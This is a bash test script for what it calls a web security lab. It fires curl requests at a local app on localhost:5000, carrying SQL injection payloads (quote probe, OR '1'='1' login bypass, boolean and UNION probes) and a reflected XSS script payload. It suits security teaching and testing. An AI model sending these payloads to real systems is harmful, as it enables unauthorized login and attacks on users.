#!/bin/bash

BASE_URL="http://localhost:5000"

echo "🔍 Web Security Lab - SQL Injection Test Suite"
echo "Base URL: $BASE_URL"
echo ""

# Test 1: Control - Valid login
echo "1. Control Test - Valid Login"
curl -X POST "$BASE_URL/login" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=admin&password=password123" \
  -c cookies.txt -L -w "Status: %{http_code}, Length: %{size_download}, Time: %{time_total}s\n" \
  -o response1.html
echo ""

# Test 2: Single quote injection
echo "2. Single Quote Injection"
curl -X POST "$BASE_URL/login" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=admin'&password=test" \
  -w "Status: %{http_code}, Length: %{size_download}, Time: %{time_total}s\n" \
  -o response2.html
echo ""

# Test 3: Basic SQL Injection - Boolean True
echo "3. Basic SQL Injection - Boolean True"
curl -X POST "$BASE_URL/login" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=admin' OR '1'='1' --&password=anything" \
  -w "Status: %{http_code}, Length: %{size_download}, Time: %{time_total}s\n" \
  -o response3.html
echo ""

# Test 4: Basic SQL Injection - Boolean False
echo "4. Basic SQL Injection - Boolean False"
curl -X POST "$BASE_URL/login" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=admin' AND '1'='2' --&password=test" \
  -w "Status: %{http_code}, Length: %{size_download}, Time: %{time_total}s\n" \
  -o response4.html
echo ""

# Test 5: URL Encoded Payload
echo "5. URL Encoded SQL Injection"
curl -X POST "$BASE_URL/login" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-urlencode "username=admin' OR '1'='1' --" \
  --data-urlencode "password=test" \
  -w "Status: %{http_code}, Length: %{size_download}, Time: %{time_total}s\n" \
  -o response5.html
echo ""

# Test 6: Union-based skeleton (SQLite specific)
echo "6. Union-based Injection Attempt"
curl -X POST "$BASE_URL/login" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=' UNION SELECT 1,2,3 --&password=test" \
  -w "Status: %{http_code}, Length: %{size_download}, Time: %{time_total}s\n" \
  -o response6.html
echo ""

# Test 7: XSS Test (if logged in)
echo "7. Reflected XSS Test"
curl -G "$BASE_URL/dashboard" \
  --data-urlencode "msg=<script>alert('XSS')</script>" \
  -b cookies.txt \
  -w "Status: %{http_code}, Length: %{size_download}, Time: %{time_total}s\n" \
  -o response7.html
echo ""

echo "✅ Tests completed. Check response files: response[1-7].html"